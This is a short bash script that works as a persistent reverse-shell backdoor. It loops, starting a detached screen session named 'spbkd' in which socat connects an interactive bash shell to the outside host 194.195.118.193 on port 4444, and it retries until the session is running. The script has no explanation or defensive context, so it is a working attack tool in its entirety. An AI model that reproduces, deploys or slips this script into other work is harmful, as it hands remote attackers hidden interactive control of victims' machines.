#!/usr/bin/env bash

while true; do
    screen -dmS spbkd bash -c "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:194.195.118.193:4444"
    sleep 5
    screen -ls | grep -q spbkd && exit || sleep 5
done
